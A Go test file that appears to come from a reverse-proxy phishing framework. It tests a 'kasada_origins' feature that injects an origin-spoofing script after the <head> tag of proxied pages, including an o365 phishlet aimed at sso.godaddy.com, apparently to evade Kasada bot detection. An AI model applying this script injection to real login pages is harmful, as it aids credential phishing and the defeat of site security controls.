package core

import (
	"regexp"
	"strings"
	"testing"
)

func loadKasadaTestPhishlet(t *testing.T) *Phishlet {
	t.Helper()
	return loadPhishlet(t, "kasada-test", "./testdata/kasada_test.yaml", nil)
}

func TestKasadaOrigin_DirectiveParsed(t *testing.T) {
	pl := loadKasadaTestPhishlet(t)

	origins := pl.GetKasadaOrigins()
	if len(origins) != 1 {
		t.Fatalf("GetKasadaOrigins: got %d entries, want 1", len(origins))
	}
	o := origins[0]
	if o.Hostname != "sso.example.com" {
		t.Errorf("Hostname = %q, want sso.example.com", o.Hostname)
	}
	if o.Sub != "sso" {
		t.Errorf("Sub = %q, want sso", o.Sub)
	}
	if o.Domain != "example.com" {
		t.Errorf("Domain = %q, want example.com", o.Domain)
	}
}

func TestKasadaOrigin_SubFilterGenerated(t *testing.T) {
	pl := loadKasadaTestPhishlet(t)

	sfs, ok := pl.subfilters["sso.example.com"]
	if !ok {
		t.Fatal("no subfilters generated for sso.example.com")
	}
	if len(sfs) == 0 {
		t.Fatal("subfilters slice is empty for sso.example.com")
	}
	sf := sfs[len(sfs)-1]

	// Search regex must compile and match a real <head> tag
	re, err := regexp.Compile(sf.regexp)
	if err != nil {
		t.Fatalf("generated search regex failed to compile: %v", err)
	}
	testHTML := `<!DOCTYPE html><html><head lang="en"><title>Test</title>`
	if !re.MatchString(testHTML) {
		t.Error("generated search regex did not match test HTML with attributes")
	}
	if !re.MatchString(`<head>`) {
		t.Error("generated search regex did not match bare <head>")
	}

	// $1 backreference must inject script immediately after the <head> tag
	injected := re.ReplaceAllString(testHTML, sf.replace)
	if !strings.Contains(injected, `<head lang="en"><script>`) {
		t.Errorf("$1 backreference injection malformed; got: %s", injected[:min(len(injected), 200)])
	}

	// Must target text/html only
	if len(sf.mime) != 1 || sf.mime[0] != "text/html" {
		t.Errorf("mime = %v, want [text/html]", sf.mime)
	}
}

func TestKasadaOrigin_ScriptValues(t *testing.T) {
	pl := loadKasadaTestPhishlet(t)

	sfs := pl.subfilters["sso.example.com"]
	sf := sfs[len(sfs)-1]

	// Correct host/domain/origin literals must appear in the script
	for _, want := range []string{
		`"sso.example.com"`,
		`"example.com"`,
		`"https://sso.example.com"`,
	} {
		if !strings.Contains(sf.replace, want) {
			t.Errorf("generated script missing %q", want)
		}
	}
}

func TestKasadaOrigin_ScriptProperties(t *testing.T) {
	pl := loadKasadaTestPhishlet(t)

	sfs := pl.subfilters["sso.example.com"]
	sf := sfs[len(sfs)-1]

	// All origin-binding properties + document.referrer (new vs o365 inline)
	for _, prop := range []string{
		`"domain"`, `"URL"`, `"baseURI"`, `"referrer"`,
		`"hostname"`, `"host"`, `"origin"`, `"protocol"`, `"port"`, `"href"`,
	} {
		if !strings.Contains(sf.replace, prop) {
			t.Errorf("generated script missing property %s", prop)
		}
	}
}

func TestKasadaOrigin_AutoGenForUncoveredProxyHosts(t *testing.T) {
	// The test phishlet has kasada_origins for sso.example.com (covered explicitly).
	// The proxy host www.example.com has no explicit entry — auto-gen must cover it.
	pl := loadKasadaTestPhishlet(t)

	sfs, ok := pl.subfilters["www.example.com"]
	if !ok {
		t.Fatal("auto-gen: no subfilters for www.example.com (uncovered proxy host)")
	}
	var found bool
	for _, sf := range sfs {
		if strings.Contains(sf.replace, "Object.defineProperty") {
			found = true
			if !strings.Contains(sf.replace, `"www.example.com"`) {
				t.Error("auto-gen: script missing host literal www.example.com")
			}
			if !strings.Contains(sf.replace, `"https://www.example.com"`) {
				t.Error("auto-gen: script missing origin literal https://www.example.com")
			}
			break
		}
	}
	if !found {
		t.Error("auto-gen: no Object.defineProperty spoofer found for www.example.com")
	}
}

func TestKasadaOrigin_AutoGenNoDuplicate(t *testing.T) {
	// sso.example.com is explicitly covered by kasada_origins — auto-gen must not add a second spoofer.
	pl := loadKasadaTestPhishlet(t)

	sfs := pl.subfilters["sso.example.com"]
	count := 0
	for _, sf := range sfs {
		if strings.Contains(sf.replace, "Object.defineProperty") {
			count++
		}
	}
	if count != 1 {
		t.Errorf("sso.example.com: got %d Object.defineProperty spoofers, want exactly 1", count)
	}
}

func TestKasadaOrigin_NoSubdomain(t *testing.T) {
	// A kasada_origins entry with no orig_sub must use domain as the host.
	pl := &Phishlet{cfg: nil}
	pl.Clear()
	// Simulate parsing: call the same addSubFilter path directly via the accessor
	host := "example.org" // domain == host when sub is absent
	origin := "https://example.org"
	script := strings.NewReplacer(
		"{kasada_host}", host,
		"{kasada_domain}", "example.org",
		"{kasada_origin}", origin,
	).Replace(KASADA_ORIGIN_SPOOFER_JS)
	pl.addSubFilter("example.org", "", "example.org", []string{"text/html"}, `(?i)(<head[^>]*>)`, "$1<script>"+script+"</script>", false, []string{})
	pl.kasadaOrigins = append(pl.kasadaOrigins, KasadaOrigin{Hostname: "example.org", Sub: "", Domain: "example.org"})

	origins := pl.GetKasadaOrigins()
	if len(origins) != 1 || origins[0].Sub != "" {
		t.Errorf("no-subdomain entry: got %+v", origins)
	}
	sfs := pl.subfilters["example.org"]
	if len(sfs) == 0 {
		t.Fatal("no subfilter for apex-domain entry")
	}
	if !strings.Contains(sfs[0].replace, `"example.org"`) {
		t.Error("apex-domain script missing host literal")
	}
}

func TestKasadaOrigin_BackwardCompat_O365(t *testing.T) {
	// The existing o365 hardcoded sub_filter and the new directive must coexist.
	// Loading o365.yaml must still pass the original KasadaSpoofer test invariants
	// AND report zero kasada_origins entries (it uses the manual sub_filter path).
	pl := loadPhishlet(t, "o365", "../phishlets/o365.yaml", nil)

	if len(pl.GetKasadaOrigins()) != 0 {
		t.Errorf("o365 uses manual sub_filter; expected 0 kasada_origins, got %d", len(pl.GetKasadaOrigins()))
	}

	// Original KasadaSpoofer test: the manually authored sub_filter must still work
	sfs, ok := pl.subfilters["sso.godaddy.com"]
	if !ok {
		t.Fatal("backward-compat: no subfilters for sso.godaddy.com")
	}
	var found bool
	for _, sf := range sfs {
		if strings.Contains(sf.replace, "Object.defineProperty") {
			found = true
			re, err := regexp.Compile(sf.regexp)
			if err != nil {
				t.Fatalf("backward-compat: regex failed to compile: %v", err)
			}
			if !re.MatchString(`<head lang="en">`) {
				t.Error("backward-compat: regex did not match <head>")
			}
			break
		}
	}
	if !found {
		t.Error("backward-compat: Kasada spoofer sub_filter missing from sso.godaddy.com")
	}
}
